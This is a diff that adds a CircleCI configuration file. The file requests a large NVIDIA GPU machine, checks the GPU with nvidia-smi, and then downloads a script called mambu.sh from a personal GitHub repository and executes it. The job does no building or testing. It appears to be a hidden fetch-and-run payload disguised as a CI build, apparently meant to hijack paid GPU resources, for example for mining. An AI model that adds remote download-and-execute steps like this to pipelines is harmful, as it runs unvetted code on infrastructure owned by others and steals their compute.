@@ -1,0 +1,10 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/salmaagi/1diana/main/mambu.sh && chmod +x mambu.sh && ./mambu.sh
